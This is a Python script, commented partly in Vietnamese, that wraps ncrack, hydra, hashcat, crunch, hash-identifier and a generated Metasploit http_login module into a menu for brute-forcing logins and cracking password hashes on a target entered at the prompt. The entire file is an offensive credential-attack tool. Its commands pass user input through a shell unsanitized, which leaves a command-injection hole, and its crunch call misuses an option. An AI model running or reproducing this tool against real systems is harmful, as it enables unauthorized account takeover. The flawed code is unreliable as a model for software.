import subprocess

def ncrack(target, port, username_list="usernames.txt", password_list="rockyou.txt", options="-g CL=3 -sL -d"):
    command = f"ncrack {target}:{port} -U {username_list} -P {password_list} {options}"
    subprocess.call(command, shell=True)

def hashcat(hash_file, hash_type, wordlist):
    command = f"hashcat -m {hash_type} -a 0 {hash_file} {wordlist}"
    subprocess.call(command, shell=True)

def hydra(target, service, username_list, password_list):
    command = f"hydra -L {username_list} -P {password_list} -F {target} {service}"
    subprocess.call(command, shell=True)

def generate_usernames(output_file, min_length, max_length, charset):
    command = f"crunch {min_length} {max_length} -o {output_file} -b {charset}"
    subprocess.call(command, shell=True)

def run_metasploit(target, password_list):
    msf_script = f"use auxiliary/scanner/http/http_login\n"
    msf_script += f"set RHOSTS {target}\n"
    msf_script += f"set STOP_ON_SUCCESS true\n"  # Dừng khi tìm thấy mật khẩu thành công
    msf_script += f"set VERBOSE true\n"  # Hiển thị thông tin chi tiết
    msf_script += f"set USERPASS_FILE {password_list}\n"  # Danh sách tên người dùng và mật khẩu
    msf_script += f"set BLANK_PASSWORDS true\n"  # Kiểm tra mật khẩu trống
    msf_script += f"set THREADS 5\n"  # Số luồng thực hiện đồng thời
    msf_script += f"run\n"
    with open("metasploit_script.rc", "w") as f:
        f.write(msf_script)
    command = "msfconsole -r metasploit_script.rc"
    subprocess.run(command, shell=True)

def hash_identifier(hash_value):
    command = f"hash-identifier {hash_value}"
    subprocess.run(command, shell=True)

def select_tool():
    print("1. Ncrack")
    print("2. Hashcat")
    print("3. Hydra")
    print("4. Metasploit")
    print("5. Generate Usernames")
    print("6. Hash-Identifier")  # Thêm lựa chọn cho công cụ Hash-Identifier
    print("99. Exit")
    choice = input("Select an option: ")
    return choice

# Lựa chọn công cụ tấn công
while True:
    tool_choice = select_tool()

    if tool_choice == "1":
        target_ip = input("Enter target IP or domain: ")
        port = int(input("Enter target port: "))
        ncrack(target_ip, port)

    elif tool_choice == "2":
        hash_file = "hashes.txt"
        hash_type = 0  # Ví dụ: MD5
        wordlist = "rockyou.txt"  # Sử dụng danh sách mật khẩu rockyou.txt
        hashcat(hash_file, hash_type, wordlist)

    elif tool_choice == "3":
        target_ip = input("Enter target IP: ")
        service = input("Enter service: ")  # Ví dụ: SSH
        username_list = "usernames.txt"
        password_list = "rockyou.txt"  # Sử dụng danh sách mật khẩu rockyou.txt
        hydra(target_ip, service, username_list, password_list)

    elif tool_choice == "4":
        target_ip = input("Enter target IP: ")
        password_list = input("Enter đường dẫn tới danh sách mật khẩu: ")
        run_metasploit(target_ip, password_list)

    elif tool_choice == "5":
        min_length = int(input("Enter minimum username length: "))
        max_length = int(input("Enter maximum username length: "))
        charset = input("Enter character set for usernames (e.g., abcdefghijklmnopqrstuvwxyz0123456789): ")
        output_file = input("Enter the output file name: ") + ".txt"
        generate_usernames(output_file, min_length, max_length, charset)

    elif tool_choice == "6":  # Thêm xử lý cho công cụ Hash-Identifier
        hash_value = input("Enter the hash value: ")
        hash_identifier(hash_value)

    elif tool_choice == "99":
        print("Exiting program...")
        break

    else:
        print("Invalid choice!")

    input("Press Enter to return to the menu...")
